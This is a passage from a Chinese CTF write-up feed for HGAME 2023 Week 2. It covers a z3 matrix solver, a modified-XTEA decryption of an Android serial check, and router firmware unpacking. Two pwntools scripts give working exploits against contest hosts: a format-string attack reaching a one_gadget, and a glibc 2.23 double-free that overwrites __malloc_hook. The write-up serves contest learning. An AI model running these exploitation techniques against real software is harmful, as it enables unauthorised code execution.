class="number">20</span>, <span class="number">124</span>, <span class="number">232</span>, <span class="number">122</span>, <span class="number">62</span>, <span class="number">23</span>, <span class="number">100</span>, <span class="number">161</span>, <span class="number">36</span>, <span class="number">118</span>, <span class="number">21</span>, <span class="number">184</span>, <span class="number">26</span>, <span class="number">142</span>, <span class="number">59</span>, <span class="number">31</span>, <span class="number">186</span>, <span class="number">82</span>, <span class="number">79</span>]</span><br><span class="line">out = [<span class="number">0</span>] * <span class="built_in">len</span>(x)</span><br><span class="line">c = [<span class="number">63998</span>, <span class="number">33111</span>, <span class="number">67762</span>, <span class="number">54789</span>, <span class="number">61979</span>, <span class="number">69619</span>, <span class="number">37190</span>, <span class="number">70162</span>, <span class="number">53110</span>, <span class="number">68678</span>, <span class="number">63339</span>, <span class="number">30687</span>, <span class="number">66494</span>, <span class="number">50936</span>, <span class="number">60810</span>, <span class="number">48784</span>, <span class="number">30188</span>, <span class="number">60104</span>, <span class="number">44599</span>, <span class="number">52265</span>, <span class="number">43048</span>, <span class="number">23660</span>, <span class="number">43850</span>, <span class="number">33646</span>, <span class="number">44270</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">f = [Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line">ff = f[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            out[<span class="number">5</span>*i+j] += ff[<span class="number">5</span>*i+k] * x[<span class="number">5</span>*k+j]</span><br><span class="line">        s.add(out[<span class="number">5</span>*i+j] == c[<span class="number">5</span>*i+j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(m[f[i]].as_long())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;y0ur_m@th_1s_gO0d&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="VidarCamera"><a href="#VidarCamera" class="headerlink" title="VidarCamera"></a>VidarCamera</h3><blockquote><p>兔兔最近在学习Android开发，这是他抄的相机程序</p></blockquote><p>apk内关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span>[] m229encrypthkIa6DI(<span class="type">int</span>[] iArr) &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">4</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">0</span>, <span class="number">2233</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">1</span>, <span class="number">4455</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">2</span>, <span class="number">6677</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">3</span>, <span class="number">8899</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i2 &lt; <span class="number">9</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">i3++;</span><br><span class="line">i = i2 + <span class="number">1</span>;</span><br><span class="line">UIntArray.m457setVXSXFK8(iArr, i2, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(i4 &amp; <span class="number">3</span>)) + i4) ^ UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i))) ^ i4)));</span><br><span class="line">UIntArray.m457setVXSXFK8(iArr, i, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i2)) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(UInt.m393constructorimpl(i4 &gt;&gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + i4))));</span><br><span class="line">i4 = UInt.m393constructorimpl(i4 + <span class="number">878077251</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (i3 &lt;= <span class="number">32</span>);</span><br><span class="line">i2 = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> iArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m230onCreate$lambda0(EditText inputsomething, CameraActivity <span class="built_in">this</span>$<span class="number">0</span>, AlertDialog alertDialog, View view) &#123;</span><br><span class="line">Intrinsics.checkNotNullParameter(inputsomething, <span class="string">&quot;$inputsomething&quot;</span>);</span><br><span class="line">Intrinsics.checkNotNullParameter(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> inputsomething.getText().toString();</span><br><span class="line"><span class="keyword">if</span> (obj.length() != <span class="number">40</span>) &#123;</span><br><span class="line">Toast.makeText(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;序列号不正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">40</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, i / <span class="number">4</span>, UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(obj.charAt(i)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">1</span>) &lt;&lt; <span class="string">&#x27;\b&#x27;</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] m229encrypthkIa6DI = <span class="built_in">this</span>$<span class="number">0.</span>m229encrypthkIa6DI(m446constructorimpl);</span><br><span class="line">UInt[] uIntArr = &#123;UInt.m387boximpl(<span class="number">637666042</span>), UInt.m387boximpl(<span class="number">457511012</span>), UInt.m387boximpl(-<span class="number">2038734351</span>), UInt.m387boximpl(<span class="number">578827205</span>), UInt.m387boximpl(-<span class="number">245529892</span>), UInt.m387boximpl(-<span class="number">1652281167</span>), UInt.m387boximpl(<span class="number">435335655</span>), UInt.m387boximpl(<span class="number">733644188</span>), UInt.m387boximpl(<span class="number">705177885</span>), UInt.m387boximpl(-<span class="number">596608744</span>)&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i2 + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (uIntArr[i2].m444unboximpl() != UIntArray.m452getpVg5ArA(m229encrypthkIa6DI, i2)) &#123;</span><br><span class="line">Toast.makeText(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;序列号不正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt; <span class="number">9</span>) &#123;</span><br><span class="line">alertDialog.dismiss();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">i2 = i3;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>魔改XTEA加密，修改了delta、异或操作和加密顺次，解密脚本在相应地方修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x34566543</span></span><br><span class="line">    x = delta * <span class="number">33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line">    </span><br><span class="line">c = [<span class="number">0x260202FA</span>, <span class="number">0x1B451064</span>, <span class="number">0x867B61F1</span>, <span class="number">0x228033C5</span>, <span class="number">0xF15D82DC</span>, <span class="number">0x9D8430B1</span>, <span class="number">0x19F2B1E7</span>, <span class="number">0x2BBA859C</span>, <span class="number">0x2A08291D</span>, <span class="number">0xDC707918</span>]</span><br><span class="line">key = [<span class="number">2233</span>, <span class="number">4455</span>, <span class="number">6677</span>, <span class="number">8899</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    d = decrypt(c[-<span class="number">2</span>:], key)</span><br><span class="line">    flag = long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>] + flag</span><br><span class="line">    c = c[:-<span class="number">2</span>] + [d[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;e&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>补全flag头，flag：<code>hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;</code>。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><blockquote><p>HINTS:</p><p>格式化占位符的值来自于函数的参数，同时64位程序传参不是只用寄存器的哦</p><p>%n占位符是存在溢出的</p></blockquote><p>打格式化字符串，分别泄露栈地址和 <code>__libc_start_main()</code> 地址求得libc基地址，再用one_gadget打即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">30687</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.send(p64(stack_addr)*<span class="number">0x20</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%45$p%4418c%8$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+r.recv(<span class="number">12</span>))-<span class="number">243</span></span><br><span class="line">libc_base = libc_start_main - libc.sym.__libc_start_main</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#r.recvline()</span></span><br><span class="line"></span><br><span class="line">ogg = libc_base+<span class="number">0xe3b01</span></span><br><span class="line">r.recvline()</span><br><span class="line">pl = p64(stack_addr-<span class="number">224</span>+<span class="number">2</span>)+p64(stack_addr-<span class="number">224</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%8$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&amp;<span class="number">0xffff</span>)-((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p>libc 2.23 UAF，泄露 <code>__malloc_hook()</code> 地址求得libc基地址，double free后使用 <code>realloc()</code> 调试，使得满足one_gadget条件即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">31341</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ind,size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">ind</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">ind</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">104</span></span><br><span class="line">libc_base = malloc_hook - libc.sym.__malloc_hook</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">ogg = libc_base + <span class="number">0xf1247</span></span><br><span class="line">realloc = libc_base + libc.sym.realloc</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(ogg)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Pirated-router"><a href="#Pirated-router" class="headerlink" title="Pirated router"></a>Pirated router</h3><blockquote><p>兔兔在回家的火车上,看到一个神秘的0tatoP在卖路由器,于是兔兔买了一个回家过年,但是这个路由器咋总感觉怪怪的</p></blockquote><p>路由器bin固件文件，参考<a href="https://iqqoz.com/post-3231.html#gsc.tab=0">提取路由器固件中的squashfs文件系统unsquashfs提取方法</a>，提取路由器固件中的squashfs。</p><p>安装squashfs后，使用binwalk分离bin文件：<code>binwalk -e AC10086W_FW_1.1.4.5.bin</code>，生成文件夹 <code>squashfs-root</code>，其中的squashfs文件，修改文件头为 <code>hsqs</code>。</p><p>利用 <a href="https://github.com/rampageX/firmware-mod-kit.git">firmware-mod-kit</a> 解包squashfs文件：<code>unsquashfs 1.squashfs</code>，在 <code>/bin</code> 目录中发现一个文件名比较特别的程序 <code>secret_program</code>，使用IDA查看逻辑，<code>main()</code> 函数中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _OWORD v4[<span class="number">8</span>]; <span class="comment">// [xsp+10h] [xbp+10h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [xsp+90h] [xbp+90h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [xsp+98h] [xbp+98h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+9Ch] [xbp+9Ch]</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">0</span>] = unk_4543B0;</span><br><span class="line">  v4[<span class="number">1</span>] = unk_4543C0;</span><br><span class="line">  v4[<span class="number">2</span>] = unk_4543D0;</span><br><span class="line">  v4[<span class="number">3</span>] = unk_4543E0;</span><br><span class="line">  v4[<span class="number">4</span>] = unk_4543F0;</span><br><span class="line">  v4[<span class="number">5</span>] = unk_454400;</span><br><span class="line">  v4[<span class="number">6</span>] = unk_454410;</span><br><span class="line">  v4[<span class="number">7</span>] = unk_454420;</span><br><span class="line">  v5 = <span class="number">94</span>;</span><br><span class="line">  v6 = <span class="number">35</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(&amp;unk_4543A8, *((_DWORD *)v4 + i) ^ v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取数据，简单异或操作还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">75</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">86</span>, <span class="number">77</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">64</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">124</span>, <span class="number">69</span>, <span class="number">74</span>, <span class="number">81</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">66</span>, <span class="number">81</span>, <span class="number">70</span>, <span class="number">124</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">124</span>, <span class="number">16</span>, <span class="number">98</span>, <span class="number">80</span>, <span class="number">90</span>, <span class="number">94</span>]</span><br><span class="line">ss = [k^<span class="number">35</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;unp4ck1ng_firmware_1s_3Asy&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 1</title>
    <link href="https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/"/>
    <id>https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/</id>
